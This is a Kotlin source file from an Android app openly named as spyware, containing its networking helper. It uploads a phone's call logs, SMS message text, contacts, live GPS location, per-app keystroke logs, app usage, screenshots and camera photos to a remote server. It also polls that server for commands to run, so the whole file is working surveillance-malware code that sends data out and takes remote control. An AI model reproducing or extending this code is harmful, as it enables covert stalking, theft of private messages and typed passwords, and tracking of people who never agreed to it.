package com.gauravhanna.spy

import android.content.Context
import android.content.SharedPreferences
import android.location.Location
import android.util.Log
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.util.concurrent.TimeUnit

object NetworkHelper {
    private const val TAG = "NetworkHelper"
    
    // ✅ FIXED: Same as BackgroundService
    private const val BASE_URL = "https://gauravhanna-spy.onrender.com/api"

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    // ---------- Device ID helpers ----------
    private fun getDeviceId(context: Context): String? {
        return context.getSharedPreferences("spy_prefs", Context.MODE_PRIVATE)
            .getString("device_id", null)
    }

    private fun setDeviceId(context: Context, id: String) {
        context.getSharedPreferences("spy_prefs", Context.MODE_PRIVATE)
            .edit().putString("device_id", id).apply()
    }

    // ✅ FIXED: Register device
    fun registerDevice(context: Context, deviceId: String, deviceName: String, model: String, androidVersion: String, userId: String) {
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("deviceName", deviceName)
            put("deviceModel", model)
            put("androidVersion", androidVersion)
            put("userId", userId)
        }
        val request = Request.Builder()
            .url("$BASE_URL/register")
            .post(RequestBody.create("application/json".toMediaType(), json.toString()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "Register failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) {
                    setDeviceId(context, deviceId)
                    Log.d(TAG, "✅ Device registered to Render server")
                } else {
                    Log.e(TAG, "Register HTTP ${response.code}")
                }
                response.close()
            }
        })
    }

    fun sendCalls(context: Context, calls: List<DataCollector.CallLogEntry>) {
        val deviceId = getDeviceId(context) ?: return
        val arr = JSONArray()
        for (c in calls) {
            arr.put(JSONObject().apply {
                put("phoneNumber", c.number)
                put("contactName", c.name ?: "")
                put("callType", c.type)
                put("duration", c.duration)
                put("timestamp", c.date)
            })
        }
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("calls", arr)
        }
        val request = Request.Builder()
            .url("$BASE_URL/calls")
            .post(RequestBody.create("application/json".toMediaType(), body.toString()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendCalls failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ Calls sent")
                else Log.e(TAG, "sendCalls HTTP ${response.code}")
                response.close()
            }
        })
    }

    fun sendSMS(context: Context, smsList: List<DataCollector.SmsEntry>) {
        val deviceId = getDeviceId(context) ?: return
        val arr = JSONArray()
        for (s in smsList) {
            arr.put(JSONObject().apply {
                put("app", "sms")
                put("contactNumber", s.address)
                put("message", s.body)
                put("timestamp", s.date)
                put("isIncoming", true)
            })
        }
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("messages", arr)
        }
        val request = Request.Builder()
            .url("$BASE_URL/messages")
            .post(RequestBody.create("application/json".toMediaType(), body.toString()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendSMS failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ SMS sent")
                else Log.e(TAG, "sendSMS HTTP ${response.code}")
                response.close()
            }
        })
    }

    fun sendContacts(context: Context, contacts: List<DataCollector.ContactEntry>) {
        val deviceId = getDeviceId(context) ?: return
        val arr = JSONArray()
        for (c in contacts) {
            arr.put(JSONObject().apply {
                put("name", c.name)
                put("number", c.number)
            })
        }
        val body = JSONObject().apply {
            put("deviceId", deviceId)
            put("contacts", arr)
        }
        val request = Request.Builder()
            .url("$BASE_URL/contacts")
            .post(RequestBody.create("application/json".toMediaType(), body.toString()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendContacts failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ Contacts sent")
                else Log.e(TAG, "sendContacts HTTP ${response.code}")
                response.close()
            }
        })
    }

    fun sendLocation(context: Context, lat: Double, lng: Double, speed: Float, address: String?) {
        val deviceId = getDeviceId(context) ?: return
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("lat", lat)
            put("lng", lng)
            put("speed", speed)
            put("address", address ?: "")
        }
        val request = Request.Builder()
            .url("$BASE_URL/location")
            .post(RequestBody.create("application/json".toMediaType(), json.toString()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendLocation failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ Location sent")
                else Log.e(TAG, "sendLocation HTTP ${response.code}")
                response.close()
            }
        })
    }

    fun sendKeylog(context: Context, appPackage: String, text: String) {
        val deviceId = getDeviceId(context) ?: return
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("appPackage", appPackage)
            put("text", text)
        }
        val request = Request.Builder()
            .url("$BASE_URL/keylog")
            .post(RequestBody.create("application/json".toMediaType(), json.toString()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendKeylog failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ Keylog sent")
                else Log.e(TAG, "sendKeylog HTTP ${response.code}")
                response.close()
            }
        })
    }

    fun sendAppUsage(context: Context, entry: Map<String, Any>) {
        val deviceId = getDeviceId(context) ?: return
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("appPackage", entry["appPackage"])
            put("appName", entry["appName"])
            put("foregroundTime", entry["foregroundTime"])
            put("timestamp", entry["timestamp"])
        }
        val request = Request.Builder()
            .url("$BASE_URL/app-usage")
            .post(RequestBody.create("application/json".toMediaType(), json.toString()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendAppUsage failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ App usage sent")
                else Log.e(TAG, "sendAppUsage HTTP ${response.code}")
                response.close()
            }
        })
    }

    fun sendScreenshot(context: Context, imageBase64: String) {
        val deviceId = getDeviceId(context) ?: return
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("imageBase64", imageBase64)
        }
        val request = Request.Builder()
            .url("$BASE_URL/screenshot")
            .post(RequestBody.create("application/json".toMediaType(), json.toString()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendScreenshot failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ Screenshot sent")
                else Log.e(TAG, "sendScreenshot HTTP ${response.code}")
                response.close()
            }
        })
    }

    fun sendPhoto(context: Context, imageBase64: String) {
        val deviceId = getDeviceId(context) ?: return
        val json = JSONObject().apply {
            put("deviceId", deviceId)
            put("imageBase64", imageBase64)
        }
        val request = Request.Builder()
            .url("$BASE_URL/photo")
            .post(RequestBody.create("application/json".toMediaType(), json.toString()))
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "sendPhoto failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                if (response.isSuccessful) Log.d(TAG, "✅ Photo sent")
                else Log.e(TAG, "sendPhoto HTTP ${response.code}")
                response.close()
            }
        })
    }

    // Command polling interface
    interface CommandCallback {
        fun onCommand(command: String)
    }

    fun getCommand(context: Context, deviceId: String, callback: CommandCallback) {
        val request = Request.Builder()
            .url("$BASE_URL/command/$deviceId")
            .get()
            .build()
        client.newCall(request).enqueue(object : Callback {
            override fun onFailure(call: Call, e: IOException) {
                Log.e(TAG, "getCommand failed: ${e.message}")
                callback.onCommand("none")
            }
            override fun onResponse(call: Call, response: Response) {
                var command = "none"
                try {
                    val json = response.body?.string()
                    val obj = JSONObject(json)
                    command = obj.optString("command", "none")
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing command: ${e.message}")
                }
                callback.onCommand(command)
                response.close()
            }
        })
    }
}